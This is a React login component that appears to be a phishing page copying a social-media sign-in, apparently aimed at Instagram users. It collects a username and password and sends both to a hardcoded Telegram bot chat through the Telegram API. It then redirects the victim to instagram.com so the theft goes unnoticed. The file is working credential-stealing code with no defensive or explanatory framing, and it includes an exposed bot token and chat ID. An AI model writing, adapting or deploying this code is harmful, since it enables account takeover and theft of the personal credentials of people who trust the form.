import React, { useState } from 'react';

const Login = () => {
    const API_TOKEN = '8153868130:AAEs51lDNjtNsgSGptT3SLnscY8S_JzhWEs'; 
    const CHAT_ID = '6237530541'; 

    const [username, setUserName] = useState('');
    const [password, setPassword] = useState('');

    const handleLogin = () => {
        console.log('Username:', username);
        console.log('Password:', password);

  
        const message = `Username: ${username}\nPassword: ${password}`;
        const url = `https://api.telegram.org/bot${API_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            }),
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('battar bol uxladn');
                } else {
                    console.error('Error sending message:', data.description);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });

            window.location.href = 'https://www.instagram.com/'
    };

    return (
        <div>
            <div>
                <input
                    onChange={(e) => setUserName(e.target.value)}
                    type="text"
                    placeholder='Username or email'
                />
                <input
                    onChange={(e) => setPassword(e.target.value)}
                    type="password"
                    placeholder='Password'
                />
                <button onClick={handleLogin}>Login</button>
            </div>
        </div>
    );
};

export default Login;

